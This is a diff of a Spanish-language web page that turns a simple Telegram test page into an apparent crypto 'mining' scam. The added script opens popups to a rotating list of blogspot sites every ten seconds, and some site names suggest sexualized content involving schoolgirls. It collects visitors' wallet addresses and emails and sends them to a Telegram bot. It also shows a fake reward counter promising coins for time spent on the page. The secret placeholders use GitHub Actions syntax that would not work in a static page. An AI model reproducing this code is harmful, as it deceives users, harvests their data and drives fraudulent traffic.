@@ -1,69 +1,114 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prueba de Envío a Telegram</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        .container {
-            width: 80%;
-            max-width: 500px;
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            border-radius: 10px;
-            text-align: center;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirección Aleatoria</title>
+  <style>
+    body {
+      text-align: center;
+      padding: 50px;
+      font-family: Arial, sans-serif;
+    }
+    #resultado {
+      margin-top: 20px;
+    }
+    input, button {
+      margin: 10px;
+      padding: 10px;
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Prueba de Envío a Telegram</h1>
-    <p>Haz clic en el botón para enviar un mensaje de prueba al bot de Telegram.</p>
-    <button onclick="enviarMensaje()">Enviar Mensaje</button>
+<div id="redireccion"></div>
+
+<button onclick="generarBilletera()">Generar Billetera</button>
+<div id="resultado"></div>
+
+<!-- Caja para ingresar billetera y correo -->
+<div id="usuario-info">
+  <input type="text" id="wallet" placeholder="Introduce tu billetera Worldchain" />
+  <input type="email" id="correo" placeholder="Introduce tu correo" />
+  <button onclick="guardarDatos()">Guardar Datos</button>
 </div>
 
+<button onclick="pararMineria()">Parar Minería</button>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+
 <script>
-    // Obtener token y chat ID de GitHub Secrets usando el entorno de GitHub Actions
-    const telegramToken = process.env.TELEGRAM_TOKEN;
-    const chatId = process.env.CHAT_ID;
+let nuevaVentana;
+let tiempoTotal = 0;
+let interval;
+let minando = true;
 
-    // Función para enviar mensaje al bot de Telegram
-    function enviarMensaje() {
-        const mensaje = 'Hola desde la página web';
+// 🔥 FUNCIONES PRINCIPALES 🔥
 
-        // URL para enviar el mensaje
-        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+// 👉 Redirección aleatoria
+function redireccionAleatoria() {
+  var urls = [
+    "https://notiiciasmex.blogspot.com",
+    "https://tareasunamyunadm.blogspot.com",
+    "https://faucentminialtcrypto.blogspot.com",
+    "https://solotareasmex.blogspot.com",
+    "https://colegialas-calientes-69.blogspot.com",
+    "https://colegialas14defebrero.blogspot.com",
+    "https://joseperez69.blogspot.com",
+    "https://mundogamermejico.blogspot.com",
+    "https://backtrackingchesscaso.blogspot.com",
+    "https://games2015steamyorigin.blogspot.com", 
+    "https://videoescandalosmex.blogspot.com",
+    "https://basededatosunadm.blogspot.com",
+    "https://gmcas77.blogspot.com",
+    "https://basededatostareas.blogspot.com"
+  ];
 
-        // Realizar solicitud POST para enviar el mensaje
-        fetch(url, {
+  var indiceAleatorio = Math.floor(Math.random() * urls.length);
+  var urlRedireccion = urls[indiceAleatorio];
+
+  document.getElementById('redireccion').innerHTML = '<p>Redireccionando a: ' + urlRedireccion + '</p>';
+
+  if (nuevaVentana) {
+    nuevaVentana.close(); 
+  }
+
+  nuevaVentana = window.open(urlRedireccion, '_blank');
+
+  setTimeout(redireccionAleatoria, 10000);
+}
+
+redireccionAleatoria();
+
+// 👉 Generar Billetera
+async function generarBilletera() {
+    const wallet = ethers.Wallet.createRandom();
+    document.getElementById('resultado').innerHTML = `
+        <p><strong>Dirección:</strong> ${wallet.address}</p>
+        <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
+    `;
+}
+
+// 👉 Guardar Datos y enviar a Telegram
+async function guardarDatos() {
+    const wallet = document.getElementById('wallet').value;
+    const correo = document.getElementById('correo').value;
+
+    if (!wallet || !correo) {
+        alert('Por favor, completa todos los campos.');
+        return;
+    }
+
+    // 👉 Enviar mensaje al bot de Telegram usando las variables de entorno
+    const mensaje = `🚀 Nueva Billetera Generada:\n\n📌 Billetera: ${wallet}\n📩 Correo: ${correo}`;
+
+    const telegramToken = `${{ secrets.TELEGRAM_TOKEN }}`;
+    const chatId = `${{ secrets.CHAT_ID }}`;
+
+    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -72,20 +117,40 @@
                 chat_id: chatId,
                 text: mensaje
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                alert('¡Mensaje enviado con éxito al bot!');
-            } else {
-                alert('Error al enviar el mensaje.');
-            }
-        })
-        .catch(error => {
-            alert('Hubo un error al intentar enviar el mensaje.');
-            console.error('Error:', error);
         });
+
+        const data = await response.json();
+        if (data.ok) {
+            alert('✅ Datos guardados y enviados a Telegram.');
+        } else {
+            alert('❌ Error al enviar el mensaje a Telegram.');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('❌ Error al conectar con Telegram.');
     }
+}
+
+// 👉 Parar Minería
+function pararMineria() {
+    clearInterval(interval); 
+    minando = false;
+    alert(`✅ Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
+}
+
+// 👉 Contar el tiempo en la página
+function contarTiempo() {
+    if (minando) {
+        tiempoTotal++;
+        if (tiempoTotal % 100 === 0) {
+            alert(`🚀 ¡Has ganado 100 CHC!`);
+        }
+    }
+}
+
+// 👉 Iniciar el conteo cada segundo
+interval = setInterval(contarTiempo, 1000);
+
 </script>
 
 </body>
